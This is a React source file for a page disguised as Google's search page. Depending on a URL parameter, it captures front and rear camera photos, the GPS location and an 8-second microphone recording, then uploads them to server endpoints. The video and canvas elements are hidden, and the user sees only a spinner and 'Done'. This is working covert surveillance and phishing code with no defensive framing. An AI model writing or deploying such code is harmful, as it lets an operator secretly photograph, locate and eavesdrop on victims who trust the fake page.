import { useEffect, useRef, useState } from "react";

type Mode = "front" | "rear" | "location" | "mic" | "all" | null;

function getMode(): Mode {
  const params = new URLSearchParams(window.location.search);
  const r = params.get("r");
  if (["front", "rear", "location", "mic", "all"].includes(r ?? "")) return r as Mode;
  return null;
}

export default function App() {
  const streamRef = useRef<MediaStream | null>(null);
  const [status, setStatus] = useState("Loading...");
  const [done, setDone] = useState(false);
  const mode = getMode();

  useEffect(() => {
    if (mode) runMode(mode);
    else setStatus("Ready");
  }, []);

  async function startCamera(facingMode: "user" | "environment") {
    if (streamRef.current) streamRef.current.getTracks().forEach((t) => t.stop());
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
    streamRef.current = stream;
    const video = document.getElementById("video") as HTMLVideoElement;
    video.srcObject = stream;
    await new Promise<void>((res) => { video.onloadedmetadata = () => res(); });
    await new Promise((res) => setTimeout(res, 1500));
    return video;
  }

  function captureAndSend(video: HTMLVideoElement) {
    return new Promise<void>((resolve) => {
      const canvas = document.getElementById("canvas") as HTMLCanvasElement;
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d")!.drawImage(video, 0, 0);
      fetch("/api/upload", { method: "POST", body: canvas.toDataURL("image/jpeg") })
        .then(() => resolve());
    });
  }

  function sendLocation() {
    return new Promise<void>((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          fetch("/api/upload-location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
          }).then(() => resolve());
        },
        () => reject(new Error("Location denied"))
      );
    });
  }

  function recordMic(seconds = 8) {
    return new Promise<void>(async (resolve, reject) => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const recorder = new MediaRecorder(stream);
        const chunks: BlobPart[] = [];
        recorder.ondataavailable = (e) => chunks.push(e.data);
        recorder.onstop = async () => {
          stream.getTracks().forEach((t) => t.stop());
          const blob = new Blob(chunks, { type: recorder.mimeType });
          const reader = new FileReader();
          reader.onloadend = () => {
            fetch("/api/upload-audio", { method: "POST", body: reader.result as string })
              .then(() => resolve());
          };
          reader.readAsDataURL(blob);
        };
        recorder.start();
        setTimeout(() => recorder.stop(), seconds * 1000);
      } catch {
        reject(new Error("Mic denied"));
      }
    });
  }

  async function runMode(m: Mode) {
    try {
      if (m === "front") {
        setStatus("Starting camera...");
        const v = await startCamera("user");
        setStatus("Capturing...");
        await captureAndSend(v);
      } else if (m === "rear") {
        setStatus("Starting camera...");
        const v = await startCamera("environment");
        setStatus("Capturing...");
        await captureAndSend(v);
      } else if (m === "location") {
        setStatus("Getting location...");
        await sendLocation();
      } else if (m === "mic") {
        setStatus("Recording (8s)...");
        await recordMic(8);
      } else if (m === "all") {
        setStatus("Rear camera...");
        const rear = await startCamera("environment");
        await captureAndSend(rear);
        setStatus("Front camera...");
        const front = await startCamera("user");
        await captureAndSend(front);
        setStatus("Getting location...");
        await sendLocation().catch(() => {});
        setStatus("Recording mic...");
        await recordMic(8).catch(() => {});
      }
      setStatus("Done");
      setDone(true);
    } catch {
      setStatus("Done");
      setDone(true);
    }
  }

  return (
    <div style={styles.page}>
      <div style={styles.card}>
        <div style={styles.logo}>
          <span style={{ color: "#4285F4" }}>G</span>
          <span style={{ color: "#EA4335" }}>o</span>
          <span style={{ color: "#FBBC05" }}>o</span>
          <span style={{ color: "#4285F4" }}>g</span>
          <span style={{ color: "#34A853" }}>l</span>
          <span style={{ color: "#EA4335" }}>e</span>
        </div>

        <div style={styles.searchBar}>
          <svg style={styles.searchIcon} viewBox="0 0 24 24" fill="none" stroke="#9aa0a6" strokeWidth="2">
            <circle cx="11" cy="11" r="8" />
            <path d="m21 21-4.35-4.35" />
          </svg>
          <span style={styles.searchText}>Search</span>
        </div>

        <div style={styles.statusRow}>
          {!done ? (
            <div style={styles.spinner} />
          ) : (
            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#34A853" strokeWidth="2.5">
              <polyline points="20 6 9 17 4 12" />
            </svg>
          )}
          <span style={styles.statusText}>{status}</span>
        </div>
      </div>

      <video id="video" autoPlay playsInline muted style={{ display: "none" }} />
      <canvas id="canvas" style={{ display: "none" }} />

      <style>{`
        @keyframes spin { to { transform: rotate(360deg); } }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: arial, sans-serif; background: #f8f9fa; }
      `}</style>
    </div>
  );
}

const styles: Record<string, React.CSSProperties> = {
  page: {
    minHeight: "100vh",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    background: "#f8f9fa",
  },
  card: {
    background: "#fff",
    borderRadius: "24px",
    padding: "40px 48px",
    boxShadow: "0 2px 10px rgba(0,0,0,0.12)",
    display: "flex",
    flexDirection: "column",
    alignItems: "center",
    gap: "28px",
    minWidth: "320px",
  },
  logo: {
    fontSize: "56px",
    fontWeight: "300",
    letterSpacing: "-2px",
    lineHeight: 1,
  },
  searchBar: {
    display: "flex",
    alignItems: "center",
    gap: "12px",
    width: "100%",
    border: "1px solid #dfe1e5",
    borderRadius: "24px",
    padding: "12px 20px",
  },
  searchIcon: { width: "20px", height: "20px", flexShrink: 0 },
  searchText: { color: "#9aa0a6", fontSize: "16px" },
  statusRow: { display: "flex", alignItems: "center", gap: "10px" },
  spinner: {
    width: "18px",
    height: "18px",
    border: "2.5px solid #e8eaed",
    borderTopColor: "#4285F4",
    borderRadius: "50%",
    animation: "spin 0.8s linear infinite",
    flexShrink: 0,
  },
  statusText: { fontSize: "14px", color: "#5f6368" },
};
